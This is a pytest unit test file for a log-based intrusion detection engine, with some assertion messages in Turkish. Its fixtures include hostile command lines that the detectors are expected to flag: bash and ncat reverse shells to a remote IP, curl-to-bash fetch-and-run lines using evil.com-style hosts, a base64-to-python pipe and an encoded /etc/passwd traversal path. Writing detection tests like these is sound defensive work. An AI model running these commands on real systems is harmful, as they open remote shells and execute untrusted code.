from __future__ import annotations
"""
tests/unit/test_detection.py
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Detection engine unit tests.

Coverage:
  - YAMLConditionEvaluator (action, outcome, fields, first_seen, contains_any)
  - ThresholdDetector (sliding window, cooldown)
  - IOCMatcher (ip, domain)
  - RegexDetector (reverse shell pattern)
  - DetectionEngine (integrated analyze path)

Run:
    pytest tests/unit/test_detection.py -v
"""

import sys
import time
import pytest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.detection import (
    YAMLConditionEvaluator, ThresholdDetector, IOCMatcher,
    RegexDetector, DetectionEngine, DetectionResult, SequenceDetector,
)
from core.normalize import NormalizedEvent


# ── Helpers ────────────────────────────────────────────────────────────────

def make_event(**kwargs) -> NormalizedEvent:
    defaults = dict(
        ts=time.time(), source="auth.log", category="auth",
        action="ssh_login", outcome="success",
        user="alice", src_ip="10.0.0.1", process="sshd",
        host="server01", message="test event",
        fields={}, distro_family="debian",
    )
    defaults.update(kwargs)
    return NormalizedEvent(**defaults)


# ── YAMLConditionEvaluator ────────────────────────────────────────────────────

class TestYAMLConditionEvaluator:

    @pytest.fixture
    def evaluator(self):
        return YAMLConditionEvaluator()

    def test_action_match(self, evaluator):
        evt = make_event(action="ssh_login")
        assert evaluator.matches({"action": "ssh_login"}, evt)

    def test_action_no_match(self, evaluator):
        evt = make_event(action="sudo")
        assert not evaluator.matches({"action": "ssh_login"}, evt)

    def test_action_list_match(self, evaluator):
        evt = make_event(action="ssh_login")
        assert evaluator.matches({"action": ["ssh_login", "sudo"]}, evt)

    def test_outcome_match(self, evaluator):
        evt = make_event(outcome="failure")
        assert evaluator.matches({"outcome": "failure"}, evt)

    def test_user_negation(self, evaluator):
        evt = make_event(user="alice")
        assert evaluator.matches({"user": "!root"}, evt)
        assert not evaluator.matches({"user": "!alice"}, evt)

    def test_distro_filter(self, evaluator):
        evt = make_event(distro_family="rhel")
        assert evaluator.matches({"distro": "rhel"}, evt)
        assert not evaluator.matches({"distro": "debian"}, evt)

    def test_fields_contains(self, evaluator):
        evt = make_event(fields={"exec_full": "curl http://evil.com | bash"})
        assert evaluator.matches({"fields": {"exec_full_contains": "curl"}}, evt)
        assert not evaluator.matches({"fields": {"exec_full_contains": "wget"}}, evt)

    def test_fields_contains_any(self, evaluator):
        evt = make_event(fields={"exec_full": "curl http://evil.com | bash"})
        assert evaluator.matches({"fields": {"exec_full_contains_any": ["| bash", "| sh"]}}, evt)
        assert not evaluator.matches({"fields": {"exec_full_contains_any": ["wget", "python"]}}, evt)

    def test_nested_field_match(self, evaluator):
        evt = make_event(fields={"identity": {"account": "alice", "domain": "example"}})
        assert evaluator.matches({"fields": {"identity.account_contains": "ali"}}, evt)
        assert evaluator.matches({"fields": {"identity.domain": "example"}}, evt)
        assert not evaluator.matches({"fields": {"identity.domain": "other"}}, evt)

    def test_fields_gte(self, evaluator):
        evt = make_event(fields={"consecutive_fails": 10})
        assert evaluator.matches({"fields": {"consecutive_fails_gte": 5}}, evt)
        assert not evaluator.matches({"fields": {"consecutive_fails_gte": 15}}, evt)

    def test_fields_numeric_compare_additive_suffixes(self, evaluator):
        evt = make_event(fields={"risk_score": "42.5"})
        assert evaluator.matches({"fields": {"risk_score_gt": 40}}, evt)
        assert evaluator.matches({"fields": {"risk_score_lte": 42.5}}, evt)
        assert evaluator.matches({"fields": {"risk_score_between": [40, 45]}}, evt)
        assert evaluator.matches({"fields": {"risk_score_neq": 41}}, evt)
        assert not evaluator.matches({"fields": {"risk_score_eq": 41}}, evt)

    def test_domain_derived_numeric_suffixes(self, evaluator):
        evt = make_event(fields={"domain": "a9z8y7x6w5v4u3t2.longstage.payload.example.com"})
        assert evaluator.matches({"fields": {"domain_len_gte": 30}}, evt)
        assert evaluator.matches({"fields": {"domain_label_count_gte": 4}}, evt)
        assert evaluator.matches({"fields": {"domain_label_max_len_gte": 16}}, evt)
        assert not evaluator.matches({"fields": {"domain_label_max_len_lt": 10}}, evt)

    def test_fields_semantic_decoded_variants_fallback(self, evaluator):
        evt = make_event(fields={"path": "/download/%252e%252e/%252e%252e/etc/passwd"})
        assert evaluator.matches(
            {"fields": {"path_decoded_contains": "../../etc/passwd"}},
            evt,
        )
        assert evaluator.matches(
            {"fields": {"path_decoded_lc_contains": "../../etc/passwd"}},
            evt,
        )

    def test_fields_tokenized_cmdline_matching(self, evaluator):
        evt = make_event(fields={"cmdline": 'python3 -c "import os" /tmp/run.py'})
        assert evaluator.matches({"fields": {"cmdline_token_contains": "python3"}}, evt)
        assert evaluator.matches(
            {"fields": {"cmdline_token_contains_any": ["python3", "bash"]}},
            evt,
        )
        assert evaluator.matches(
            {"fields": {"cmdline_token_contains_all": ["python3", "-c", "/tmp/run.py"]}},
            evt,
        )
        assert not evaluator.matches({"fields": {"cmdline_token_contains": "perl"}}, evt)


class TestThresholdDetectorFieldFilters:
    @pytest.fixture
    def evaluator(self):
        return YAMLConditionEvaluator()

    def test_nested_event_match_fields_gate_threshold_window(self):
        detector = ThresholdDetector(config={"rules_dir": "/tmp/aegiscore-no-threshold-rules"})
        detector._rules = [{
            "rule_id": "THR-NESTED",
            "rule_key": "THR-NESTED:sudo:failure:user",
            "event_match": {
                "action": "sudo",
                "outcome": "failure",
                "fields": {"identity.auth_service": "sudo"},
            },
            "extra_filters": {"fields": {"identity.auth_service": "sudo"}},
            "distinct_by": "",
            "group_by": "user",
            "window": 120,
            "threshold": 2,
            "severity": "high",
            "score": 75,
            "message": "nested threshold hit",
            "cooldown": 300,
            "mitre_tactic": "",
            "mitre_technique": "",
            "tags": [],
        }]

        sudo_evt_1 = make_event(
            ts=1000.0,
            action="sudo",
            outcome="failure",
            user="alice",
            fields={"identity": {"auth_service": "sudo"}},
        )
        sudo_evt_2 = make_event(
            ts=1001.0,
            action="sudo",
            outcome="failure",
            user="alice",
            fields={"identity": {"auth_service": "sudo"}},
        )
        ssh_like_evt = make_event(
            ts=1002.0,
            action="sudo",
            outcome="failure",
            user="alice",
            fields={"identity": {"auth_service": "sshd"}},
        )

        assert detector.check(sudo_evt_1) == []
        hits = detector.check(sudo_evt_2)
        assert [r.rule_id for r in hits] == ["THR-NESTED"]
        assert detector.check(ssh_like_evt) == []

    def test_fields_compound_logic(self, evaluator):
        evt = make_event(fields={"cmdline": "curl http://evil | bash", "exit_code": "5"})
        cond = {
            "fields": {
                "__all__": [
                    {"cmdline_token_contains": "curl"},
                    {"__any__": [
                        {"cmdline_contains": "| bash"},
                        {"cmdline_contains": "| sh"},
                    ]},
                    {"__not__": {"exit_code_eq": 0}},
                ]
            }
        }
        assert evaluator.matches(cond, evt)

    def test_fields_semantic_command_aliases(self, evaluator):
        evt = make_event(fields={"exec_full": "/bin/bash -c id", "parent_process": "sshd"})
        assert evaluator.matches({"fields": {"command_contains": "/bin/bash"}}, evt)
        assert evaluator.matches({"fields": {"parent_process_contains": "sshd"}}, evt)

    def test_first_seen_src_ip(self, evaluator):
        evt = make_event(src_ip="1.2.3.4")
        # First sighting → True
        assert evaluator.matches({"first_seen": "src_ip"}, evt)
        # Second sighting → False (in-memory)
        assert not evaluator.matches({"first_seen": "src_ip"}, evt)

    def test_first_seen_user_ip_pair(self, evaluator):
        evt = make_event(user="bob", src_ip="5.6.7.8")
        assert evaluator.matches({"first_seen": "user_ip_pair"}, evt)
        assert not evaluator.matches({"first_seen": "user_ip_pair"}, evt)

    def test_combined_conditions(self, evaluator):
        evt = make_event(action="ssh_login", outcome="success", user="root")
        assert evaluator.matches({"action": "ssh_login", "outcome": "success", "user": "root"}, evt)
        assert not evaluator.matches({"action": "ssh_login", "outcome": "failure"}, evt)


# ── ThresholdDetector ─────────────────────────────────────────────────────────

class TestThresholdDetector:

    @pytest.fixture
    def detector(self):
        cfg = {"rules_dir": "rules"}
        return ThresholdDetector(cfg)

    def test_brute_force_triggers_after_threshold(self, detector):
        evt = make_event(action="ssh_login", outcome="failure", src_ip="9.9.9.9")
        results = []
        for _ in range(6):
            results.extend(detector.check(evt))
        triggered = [r for r in results if r.triggered]
        assert len(triggered) >= 1, "6 başarısız SSH sonrası alert bekleniyor"

    def test_single_failure_no_alert(self, detector):
        evt = make_event(action="ssh_login", outcome="failure", src_ip="8.8.8.1")
        results = detector.check(evt)
        assert not any(r.triggered for r in results)

    def test_different_ips_independent(self, detector):
        for i in range(6):
            detector.check(make_event(action="ssh_login", outcome="failure", src_ip=f"1.1.1.{i}"))
        # Her IP 1 kez → tetiklenmemeli
        for i in range(6):
            results = detector.check(make_event(action="ssh_login", outcome="failure", src_ip=f"1.1.1.{i}"))
            assert not any(r.triggered for r in results), f"IP 1.1.1.{i} hatalı tetikleme"

    def test_sssd_identity_failure_burst_triggers(self, detector):
        evt = make_event(
            action="identity_login",
            outcome="failure",
            user="alice",
            fields={
                "auth_mechanism": "sssd",
                "identity": {"mechanism": "sssd", "phase": "auth", "account": "alice"},
            },
        )
        results = []
        for _ in range(5):
            results.extend(detector.check(evt))
        triggered = [r for r in results if r.rule_id == "THR-016"]
        assert len(triggered) >= 1, "5 SSSD failure sonrası THR-016 bekleniyor"

    def test_distinct_user_threshold_uses_unique_users(self, detector):
        results = []
        for idx in range(15):
            evt = make_event(
                action="ssh_login",
                outcome="failure",
                src_ip="203.0.113.10",
                user=f"user{idx}",
            )
            results.extend(detector.check(evt))
        triggered = [r for r in results if r.rule_id == "THR-010"]
        assert len(triggered) >= 1, "Aynı IP'den 15 farklı kullanıcı denemesi THR-010 üretmeli"

    def test_winbind_identity_failure_burst_triggers(self, detector):
        evt = make_event(
            action="identity_login",
            outcome="failure",
            user=r"EXAMPLE\\alice",
            fields={
                "auth_mechanism": "winbind",
                "identity": {"mechanism": "winbind", "phase": "auth", "account": "alice", "domain": "EXAMPLE"},
            },
        )
        results = []
        for _ in range(5):
            results.extend(detector.check(evt))
        triggered = [r for r in results if r.rule_id == "THR-017"]
        assert len(triggered) >= 1, "5 Winbind failure sonrası THR-017 bekleniyor"

    def test_openvpn_failure_burst_triggers(self, detector):
        evt = make_event(
            action="vpn_login",
            outcome="failure",
            src_ip="198.51.100.25",
            fields={"auth_mechanism": "openvpn"},
        )
        results = []
        for _ in range(3):
            results.extend(detector.check(evt))
        triggered = [r for r in results if r.rule_id == "THR-018"]
        assert len(triggered) >= 1, "3 OpenVPN failure sonrası THR-018 bekleniyor"

    def test_identity_policy_burst_groups_by_identity_account(self, detector):
        results = []
        for user in (r"EXAMPLE\\alice", "alice", r"EXAMPLE\\alice"):
            evt = make_event(
                action="account_policy",
                outcome="failure",
                user=user,
                fields={
                    "auth_mechanism": "winbind",
                    "identity": {
                        "mechanism": "winbind",
                        "phase": "account",
                        "account": "alice",
                        "domain": "EXAMPLE",
                        "policy": "account_disabled",
                    },
                },
            )
            results.extend(detector.check(evt))
        triggered = [r for r in results if r.rule_id == "THR-021"]
        assert len(triggered) >= 1, "Aynı identity.account için policy deny burst sonrası THR-021 bekleniyor"

    def test_dns_nxdomain_burst_triggers_with_semantic_field_filters(self, detector):
        evt = make_event(
            source="named",
            category="network",
            action="dns_query",
            outcome="failure",
            src_ip="192.0.2.44",
            fields={"domain": "r4nd0m-l00kup-001.subscan.example.com", "qtype": "A"},
        )
        results = []
        for _ in range(8):
            results.extend(detector.check(evt))
        triggered = [r for r in results if r.rule_id == "THR-019"]
        assert len(triggered) >= 1, "NXDOMAIN burst sonrası THR-019 bekleniyor"

    def test_dns_ptr_noise_does_not_trigger_nxdomain_burst(self, detector):
        evt = make_event(
            source="named",
            category="network",
            action="dns_query",
            outcome="failure",
            src_ip="192.0.2.45",
            fields={"domain": "1.0.0.127.in-addr.arpa", "qtype": "PTR"},
        )
        results = []
        for _ in range(10):
            results.extend(detector.check(evt))
        triggered = [r for r in results if r.rule_id == "THR-019"]
        assert not triggered, "PTR gürültüsü THR-019 üretmemeli"

    def test_single_nxdomain_does_not_trigger_dns_burst(self, detector):
        evt = make_event(
            source="named",
            category="network",
            action="dns_query",
            outcome="failure",
            src_ip="192.0.2.47",
            fields={"domain": "single-failure-check.example.com", "qtype": "A", "entropy": 3.1},
        )
        results = detector.check(evt)
        triggered = [r for r in results if r.rule_id == "THR-019"]
        assert not triggered, "Tek NXDOMAIN THR-019 üretmemeli"

    def test_beacon_like_long_dns_queries_trigger(self, detector):
        evt = make_event(
            source="named",
            category="network",
            action="dns_query",
            outcome="unknown",
            src_ip="192.0.2.46",
            fields={"domain": "aaaaaaaaaaaaaaaaaaaa01.payload.chunk01.control.example.com", "qtype": "TXT"},
        )
        results = []
        for _ in range(5):
            results.extend(detector.check(evt))
        triggered = [r for r in results if r.rule_id == "THR-020"]
        assert len(triggered) >= 1, "Uzun tekrar eden DNS sorguları THR-020 üretmeli"

    def test_high_entropy_dns_burst_triggers_thr_023(self, detector):
        evt = make_event(
            source="named",
            category="network",
            action="dns_query",
            outcome="unknown",
            src_ip="192.0.2.48",
            fields={"domain": "a9f3k2m8q1w7z5x4c6v0b2n8.example.net", "qtype": "A", "entropy": 4.12},
        )
        results = []
        for _ in range(6):
            results.extend(detector.check(evt))
        triggered = [r for r in results if r.rule_id == "THR-023"]
        assert len(triggered) >= 1, "Yüksek entropili DNS burst THR-023 üretmeli"


class TestSequenceDetector:
    def test_repeated_firewall_reject_sequence_triggers(self):
        detector = SequenceDetector()
        evt = make_event(
            category="network",
            action="firewall_reject",
            outcome="rejected",
            src_ip="198.51.100.7",
        )

        assert detector.check(evt) == []
        assert detector.check(evt) == []
        hits = detector.check(evt)

        assert any(r.rule_id == "SEQ-029" for r in hits), f"SEQ-029 tetiklenmedi: {hits}"

    def test_sequence_metadata_enrichment_survives_into_alert(self):
        detector = SequenceDetector()
        login_evt = make_event(
            category="auth",
            action="vpn_login",
            outcome="success",
            user="alice",
            src_ip="198.51.100.25",
        )
        sudo_evt = make_event(
            category="auth",
            action="sudo",
            outcome="success",
            user="alice",
            src_ip="198.51.100.25",
        )

        assert detector.check(login_evt) == []
        hits = detector.check(sudo_evt)

        seq = next(r for r in hits if r.rule_id == "SEQ-036")
        assert seq.mitre_tactic == "TA0004"
        assert seq.mitre_technique == "T1548.003"
        assert "vpn" in seq.tags
        assert seq.details["summary"]
        assert seq.details["operator_note"]

    def test_sequence_step_uses_semantic_field_matcher(self):
        detector = SequenceDetector()
        evt = make_event(
            category="process",
            action="exec",
            outcome="success",
            fields={"cmdline": 'python3 -c "import pty"'},
        )

        assert detector._step_matches(
            {"action": "exec", "fields": {"cmdline_token_contains_all": ["python3", "-c"]}},
            evt,
        )

    def test_raw_auth_sequence_stays_in_sequence_detector_not_event_chain(self):
        from core.correlation import TemporalCorrelator, EventChainDetector, AlertEvent

        detector = SequenceDetector()
        fail_evt = make_event(
            category="auth",
            action="ssh_login",
            outcome="failure",
            src_ip="198.51.100.50",
        )
        success_evt = make_event(
            category="auth",
            action="ssh_login",
            outcome="success",
            src_ip="198.51.100.50",
        )

        assert detector.check(fail_evt) == []
        hits = detector.check(success_evt)
        assert any(r.rule_id == "SEQ-001" for r in hits), f"SEQ-001 tetiklenmedi: {hits}"

        temporal = TemporalCorrelator()
        chain = EventChainDetector(temporal)
        auth_fail = AlertEvent(
            alert_id=1, ts=1000.0, rule_id="AUTH-002", severity="high",
            score=70.0, category="auth", message="SSH failure", src_ip="198.51.100.50"
        )
        auth_success = AlertEvent(
            alert_id=2, ts=1010.0, rule_id="AUTH-001", severity="high",
            score=80.0, category="auth", message="SSH success", src_ip="198.51.100.50"
        )
        temporal.add(auth_fail)
        temporal.add(auth_success)
        assert chain.check(auth_success) == []

    def test_login_success_then_ssh_prep_then_internal_push_triggers(self):
        detector = SequenceDetector()
        login_evt = make_event(
            category="auth",
            action="ssh_login",
            outcome="success",
            user="alice",
            src_ip="203.0.113.44",
        )
        prep_evt = make_event(
            category="process",
            action="process_exec",
            outcome="success",
            user="alice",
            fields={"cmdline": "ssh-keygen -t ed25519 -f /home/alice/.ssh/id_ed25519 && echo '10.0.5.20 db01' >> /etc/hosts"},
        )
        remote_evt = make_event(
            category="process",
            action="process_exec",
            outcome="success",
            user="alice",
            fields={"cmdline": "scp /tmp/bootstrap.sh alice@10.0.5.20:/tmp/bootstrap.sh"},
        )

        assert detector.check(login_evt) == []
        assert detector.check(prep_evt) == []
        hits = detector.check(remote_evt)

        assert any(r.rule_id == "SEQ-060" for r in hits), f"SEQ-060 tetiklenmedi: {hits}"

    def test_login_then_benign_ansible_playbook_does_not_trigger_ssh_pivot_sequence(self):
        detector = SequenceDetector()
        login_evt = make_event(
            category="auth",
            action="ssh_login",
            outcome="success",
            user="root",
            src_ip="203.0.113.45",
        )
        prep_evt = make_event(
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            fields={"cmdline": "ansible-playbook maintenance.yml --limit db"},
        )
        remote_evt = make_event(
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            fields={"cmdline": "ssh admin@10.0.5.20 uptime"},
        )

        assert detector.check(login_evt) == []
        assert detector.check(prep_evt) == []
        hits = detector.check(remote_evt)

        assert not any(r.rule_id == "SEQ-060" for r in hits), f"SEQ-060 yanlış tetiklendi: {hits}"

# ── IOCMatcher ────────────────────────────────────────────────────────────────

class TestIOCMatcher:

    @pytest.fixture
    def matcher(self, tmp_path):
        ioc_file = tmp_path / "ioc.txt"
        ioc_file.write_text("# test IOC\n185.220.101.5\nevil.com\n")
        return IOCMatcher(str(ioc_file))

    def test_ip_hit(self, matcher):
        evt = make_event(src_ip="185.220.101.5")
        results = matcher.check(evt)
        assert any(r.triggered for r in results)

    def test_ip_miss(self, matcher):
        evt = make_event(src_ip="10.0.0.1")
        results = matcher.check(evt)
        assert not any(r.triggered for r in results)

    def test_clean_event_no_trigger(self, matcher):
        evt = make_event(src_ip="192.168.1.1", fields={})
        results = matcher.check(evt)
        assert not any(r.triggered for r in results)


# ── RegexDetector ─────────────────────────────────────────────────────────────

class TestRegexDetector:

    @pytest.fixture
    def detector(self):
        return RegexDetector()

    def test_reverse_shell_bash(self, detector):
        evt = make_event(
            category="process", action="exec",
            message="bash -i >& /dev/tcp/185.220.101.5/4444 0>&1",
            fields={"cmdline": "bash -i >& /dev/tcp/185.220.101.5/4444 0>&1"},
        )
        results = detector.check(evt)
        assert any(r.triggered for r in results), "Reverse shell tespiti bekleniyor"

    def test_base64_decode_exec(self, detector):
        evt = make_event(
            category="process", action="exec",
            message="echo aW1wb3J0IHNvY2tldA== | base64 -d | python3",
            fields={"cmdline": "echo aW1wb3J0IHNvY2tldA== | base64 -d | python3"},
        )
        results = detector.check(evt)
        assert any(r.triggered for r in results), "Base64 decode exec tespiti bekleniyor"

    def test_netcat_c_reverse_shell_triggers(self, detector):
        evt = make_event(
            category="process", action="exec",
            message="ncat 203.0.113.99 4444 -c /bin/sh",
            fields={"cmdline": "ncat 203.0.113.99 4444 -c /bin/sh"},
        )
        results = detector.check(evt)
        assert any(r.triggered for r in results), "ncat -c reverse shell tespiti bekleniyor"

    def test_suspicious_ssh_dynamic_tunnel_triggers(self, detector):
        evt = make_event(
            category="process", action="exec",
            message="ssh -Nf -D 1080 -o StrictHostKeyChecking=no ops@198.51.100.10",
            fields={"cmdline": "ssh -Nf -D 1080 -o StrictHostKeyChecking=no ops@198.51.100.10"},
        )
        results = detector.check(evt)
        assert any(r.triggered for r in results), "Şüpheli SSH tunnel tespiti bekleniyor"

    def test_bash_c_curl_subshell_fetch_execute_triggers(self, detector):
        evt = make_event(
            category="process", action="exec",
            message='bash -c "$(curl -fsSL http://evil/p.sh)"',
            fields={"cmdline": 'bash -c "$(curl -fsSL http://evil/p.sh)"'},
        )
        results = detector.check(evt)
        assert any(r.triggered for r in results), "bash -c $(curl ...) tespiti bekleniyor"

    def test_normal_command_no_trigger(self, detector):
        evt = make_event(
            category="process", action="exec",
            message="ls -la /home/alice",
            fields={"cmdline": "ls -la /home/alice"},
        )
        results = detector.check(evt)
        assert not any(r.triggered for r in results)

    def test_benign_local_ssh_port_forward_does_not_trigger(self, detector):
        evt = make_event(
            category="process", action="exec",
            message="ssh -N -L 5432:127.0.0.1:5432 admin@bastion",
            fields={"cmdline": "ssh -N -L 5432:127.0.0.1:5432 admin@bastion"},
        )
        results = detector.check(evt)
        assert not any(r.rule_id == "REGEX-025A" for r in results)

    def test_plain_package_fetch_no_regex_trigger(self, detector):
        evt = make_event(
            category="process", action="exec",
            message="curl -fsS https://repo.example.com/pkg.deb -o /tmp/pkg.deb",
            fields={"cmdline": "curl -fsS https://repo.example.com/pkg.deb -o /tmp/pkg.deb"},
        )
        results = detector.check(evt)
        assert not any(r.rule_id == "REGEX-011" for r in results)


# ── DetectionEngine entegrasyon ───────────────────────────────────────────────

class TestDetectionEngineIntegration:

    @pytest.fixture
    def engine(self, tmp_path):
        ioc_file = tmp_path / "ioc.txt"
        ioc_file.write_text("185.220.101.5\n")
        return DetectionEngine(
            config={"rules_dir": "rules", "rules_source": "yaml"},
            ioc_file=str(ioc_file),
            allow_empty_rules=True,
        )

    def test_ioc_hit_triggers(self, engine):
        evt = make_event(src_ip="185.220.101.5")
        results = engine.analyze(evt)
        assert any(r.rule_id.startswith("IOC-") for r in results)

    def test_normal_event_no_trigger(self, engine):
        evt = make_event(action="ssh_login", outcome="success",
                         src_ip="10.0.0.1", user="alice")
        results = engine.analyze(evt)
        assert [r.rule_id for r in results] == ["FIRST-002"]

    def test_stats_count(self, engine):
        for _ in range(5):
            engine.analyze(make_event())
        stats = engine.stats()
        assert stats["events"] == 5

    def test_yaml_rule_metadata_enrichment_survives_into_alert(self, engine):
        evt = make_event(
            source="mail",
            category="network",
            action="smtp_reject",
            outcome="failure",
            src_ip="203.0.113.5",
        )

        results = engine.analyze(evt)
        hit = next(r for r in results if r.rule_id == "AUTH-014")

        assert hit.mitre_tactic == "TA0006"
        assert hit.mitre_technique == "T1110"
        assert "policy-enforcement" in hit.tags
        assert hit.details["summary"]
        assert hit.details["operator_note"]
